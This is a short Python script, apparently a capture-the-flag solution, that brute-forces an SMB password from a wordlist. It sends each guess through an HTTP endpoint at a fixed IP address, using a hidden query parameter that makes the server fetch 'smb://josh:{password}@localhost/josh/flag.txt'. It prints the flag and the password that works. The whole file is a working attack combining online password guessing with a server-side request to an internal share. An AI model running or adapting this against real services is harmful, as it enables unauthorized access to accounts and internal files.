#!/usr/bin/env python3
import requests
import sys

url = "http://138.68.93.187:6960/v2/smb?onlyifyouknowthesourcecode=smb://josh:{password}@localhost/josh/flag.txt"

with open(sys.argv[1]) as wlist:
    for pw in wlist:
        pw = pw.rstrip()

        r = requests.get(url.format(password=pw))

        if "not authenticated" not in r.text:
            if "filedescriptor out of range" not in r.text:
                print(r.text)
            print(f"PASS: {pw}")